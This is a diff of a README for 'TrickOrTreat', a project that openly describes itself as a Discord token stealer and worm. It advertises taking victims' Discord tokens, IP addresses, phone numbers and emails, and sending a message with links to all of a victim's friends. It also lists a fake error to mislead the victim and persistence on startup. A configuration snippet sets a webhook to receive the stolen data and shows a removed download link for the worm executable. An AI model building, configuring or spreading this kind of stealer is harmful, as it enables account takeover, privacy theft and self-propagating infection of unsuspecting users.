@@ -1,5 +1,5 @@
 # TrickOrTreat
-A new Discord token stealer/worm that can spread itself.
+A Discord token stealer/worm that can spread a message to all friends. Also has many features like Run On Startup, Fake Error, and etc.
 
 <p align="center">
 <img src="https://img.shields.io/github/languages/top/extatent/TrickOrTreat?style=flat-square" </a>
@@ -13,19 +13,19 @@ A new Discord token stealer/worm that can spread itself.
 **NOTE:** ⭐ If you like the project, feel free to star it ⭐
 
 #### Features:
-- Classic Mode (Sends only the Discord token and IP address in an non-embedded format.)
-- Spread Mode (Sends the file/message to all friends.)
+- Classic Mode (Sends only Discord token and IP address in an non-embedded format.)
+- Spread Mode (Sends a message to all friends.)
 - Fake Error (Throws a fake error after opening the program.)
 - Run On Startup (Runs the program once the computer is started.)
 - Sends Discord Embeds
-- Getting the user's information (Discord Token, IP Address, Phone Number, Email, Payment Info and many more)
+- Getting the user's information (Discord Token, IP Address, Phone Number, Email and many more)
 
 ### Configurations
 ```csharp
+static string webhook = "https://discord.com/api/webhooks/example/example"; // Enter Discord webhook
 static bool ClassicMode = false; // Sends only the Discord token and IP address in an non-embedded format. (true/false)
 static bool SpreadMode = false; // Sends the file/message to all friends (true/false)
-static string WormURL = "https://example.com/cool.exe"; // Enter the download link you want the user to download and spread
-static string WormMessage = ""; // Enter the message (optional)
+static string WormMessage = ""; // Enter the message you want the user to spread (the message can include invite links, download urls and so on)
 static bool FakeError = false; // Throws a fake error after opening the program (true/false)
 static bool RunOnStartup = false; // Runs the program once the computer is started (true/false)
 ```
@@ -33,9 +33,9 @@ static bool RunOnStartup = false; // Runs the program once the computer is start
   
 <details>
 <summary>Preview</summary>
-<img src="https://i.imgur.com/o50kz9w.png" alt="png">
+<img src="https://i.imgur.com/xXLae84.png" alt="png">
 
-<img src="https://i.imgur.com/KV9nmoE.png" alt="png">
+<img src="https://i.imgur.com/BN3LYfT.png" alt="png">
 </details>
 
 ## Installation
